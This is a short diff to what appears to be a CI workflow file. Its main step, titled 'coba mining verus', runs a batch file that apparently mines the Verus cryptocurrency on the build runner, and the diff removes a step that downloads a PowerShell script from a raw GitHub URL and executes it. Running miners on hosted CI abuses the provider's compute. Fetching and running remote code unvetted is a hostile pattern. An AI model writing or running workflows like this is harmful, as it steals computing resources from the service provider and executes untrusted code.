@@ -42,8 +42,4 @@ jobs:
     - name: coba mining verus
       run: |
             cmd /c vendorax.bat
-             sleep 3600
-    - name: TimeCount
-      run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/loop.ps1 -OutFile loop.ps1
-        ./loop.ps1
+             sleep 2400
